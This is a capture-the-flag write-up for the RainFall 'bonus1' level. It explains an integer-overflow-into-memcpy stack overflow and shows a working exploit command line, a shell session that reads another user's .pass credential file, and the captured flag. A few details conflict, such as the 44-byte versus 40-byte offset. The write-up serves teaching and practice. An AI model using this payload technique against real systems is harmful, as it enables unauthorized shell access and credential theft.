# Bonus1

## **Binary Analysis**

After examining the binary with GDB, we find that the program takes two command-line arguments.

- The **first argument** should be a number, which is converted using **`atoi()`** and then checked.
    - If **`number > 9`**, the program exits with **`return 1`**.
    - Otherwise, if **`number <= 9`**, the program calculates a size of **`number * 4`** for a **`memcpy()`** operation.
- The **second argument** should be a string, which is used as the source in the **`memcpy()`** operation.

```nasm
[...]
0x0804842a <+6>:	sub    $0x40,%esp  ; Allocate 64 bytes on stack
0x0804842d <+9>:	mov    0xc(%ebp),%eax ; argv[1]
0x08048430 <+12>:	add    $0x4,%eax
0x08048433 <+15>:	mov    (%eax),%eax
0x08048435 <+17>:	mov    %eax,(%esp)
0x08048438 <+20>:	call   0x8048360 [atoi@plt](mailto:atoi@plt) ; Convert to integer
0x0804843d <+25>:	mov    %eax,0x3c(%esp) ; Store result
0x08048441 <+29>:	cmpl   $0x9,0x3c(%esp) ;Compare with 9
0x08048446 <+34>:	jle    0x804844f <main+43> ;Jump if less or equal
0x08048448 <+36>:	mov    $0x1,%eax ;Return 1 if > 9
0x0804844d <+41>:	jmp    0x80484a3 <main+127>
0x0804844f <+43>:	mov    0x3c(%esp),%eax
0x08048453 <+47>:	lea    0x0(,%eax,4),%ecx ;Multiply by 4
0x0804845a <+54>:	mov    0xc(%ebp),%eax ;argv[2]
0x0804845d <+57>:	add    $0x8,%eax
0x08048460 <+60>:	mov    (%eax),%eax
0x08048462 <+62>:	mov    %eax,%edx
0x08048464 <+64>:	lea    0x14(%esp),%eax ;Destination buffer
0x08048468 <+68>:	mov    %ecx,0x8(%esp);Size (num * 4)
0x0804846c <+72>:	mov    %edx,0x4(%esp); Source
0x08048470 <+76>:	mov    %eax,(%esp)
0x08048473 <+79>:	call   0x8048320 [memcpy@plt](mailto:memcpy@plt)
0x08048478 <+84>:	cmpl   $0x574f4c46,0x3c(%esp);Compare with 0x574f4c46
0x08048480 <+92>:	jne    0x804849e <main+122> ; Jump if not equal
0x08048482 <+94>:	movl   $0x0,0x8(%esp) ; If equal, execute shell
0x0804848a <+102>:	movl   $0x8048580,0x4(%esp)
0x08048492 <+110>:	movl   $0x8048583,(%esp)
0x08048499 <+117>:	call   0x8048350 [execl@plt](mailto:execl@plt)
[...]
```

After the **`memcpy()`** operation, the program checks if a specific location in memory (where it stored the integer from the first argument) matches a particular value (**`0x574F4C46`**).

- If the check passes, the program calls **`execl`** to execute **`/bin/sh`**, effectively giving us a command shell.

## **Vulnerability**

- **Input Validation Flaw**
    - **`atoi()`** can convert negative numbers.
    - The check only ensures **`number > 9`**, ignoring negative values.
- **Integer Overflow**
    - A negative **`number`** multiplied by 4 can overflow.
    - This may create an unintended large positive size.
- **Buffer Overflow Potential**
    - The buffer is **40 bytes**.
    - **`memcpy()`** can exceed this limit if **`number * 4`** is too large.
    - This may overwrite stack memory.
- **Overwriting Critical Variable**
    - The **`number`** variable is stored after the buffer.
    - By overwriting it with **`0x574F4C46`**, we trigger shell execution.
    
    ```nasm
    |---------------------------|
    | Return Address            | <-- Top of the stack (higher memory addresses)
    |---------------------------|
    | Saved Base Pointer (EBP)  |
    |---------------------------|
    | number (4 bytes)          | <-- Stored at EBP - 4
    |---------------------------|
    | buffer[40]                | <-- Starts at EBP - 44
    |                           |
    |                           |
    |                           |     
    |                           |
    |                           |
    |                           |
    |                           |
    |                           |
    |---------------------------|
    | (Possible padding)        |
    |---------------------------|
    ```
    

## **Exploit**

To exploit the integer overflow and buffer overflow vulnerabilities to overwrite the target variable with **`0x574F4C46`**, so that the program executes a shell

**Step 1: Choose the Right Number**

- **Objective:** Find a number that, when converted by **`atoi`**, is less than or equal to 9, but when multiplied by 4 results in a large positive number due to integer overflow.
- **Solution:** Use the number -**`1073741809`**. Here's why:
    - **Converting to Integer:**
        - **`atoi("-1073741809")`** returns -**`1073741809`**.
        - This number is **less than 9**, so it passes the check.
    - **Multiplying by 4:**
        - When the program multiplies -**`1073741809 * 4`**, due to integer overflow in a 32-bit system, the result is **`44`**.
        - **Explanation of the Overflow:**
            - In a 32-bit signed integer representation, -**`1073741809`** is **`0xC0000011`**.
            - Multiplying by 4 shifts the bits, causing the sign bit to be lost and wrapping around to a small positive integer.
            
            **Multiply by 4 (equivalent to shifting left by 2):**
            
            ```
            Original:  11000000000000000000000000010001 (-1073741809)
            Times 4:   1100000000000000000000000001000100
            
            In 32-bit system, we only keep the rightmost 32 bits:
            Result:      00000000000000000000000000101100 (44 in decimal)
            ```
            

**Step 2: Craft the Payload**

- **Objective:** Create an input that, when copied into the buffer, will overwrite the critical variable with the value **`0x574F4C46`** (which represents **`"FLOW"`** in ASCII).
- **Buffer Details:**
    - The buffer starts at a certain address in memory (we'll refer to this as the buffer's starting point).
    - The critical variable we need to overwrite is located **44 bytes** after the buffer's starting point.
- **Creating the Payload:**
    - **Padding:** We need to fill the buffer with 40 bytes of arbitrary data to reach the critical variable. We'll use **`"A"`** repeated 40 times.
        
        ```python
        padding = "A" * 40
        ```
        
    - **Overwriting the Critical Variable:**
        - We need to write the bytes representing **`0x574F4C46`** in little-endian format (least significant byte first) to overwrite the variable.
            - Little-endian representation of **`0x574F4C46`** is **`"\x46\x4C\x4F\x57"`**.
        
        ```python
        overwrite = "\x46\x4C\x4F\x57"
        ```
        
    - **Complete Payload:**
        - The payload is the padding plus the overwrite value.
        
        ```python
        payload = padding + overwrite
        ```
        

**Step 3: Execute the Exploit**

- **Command Line Execution:**
    - We run the program with the first argument as **`1073741809`** and the second argument as our payload.
        
        ```bash
        ./bonus1 -1073741809 $(python -c 'print "A"*40 + "\x46\x4C\x4F\x57"')
        ```
        

**Step 4:the resulte**

```nasm
bonus1@RainFall:~$ ./bonus1 -1073741809 $(python -c 'print "A"*40 + "\x46\x4C\x4F\x57"')
$ whoami
bonus2
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
$
```

## **Flag**

```nasm
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```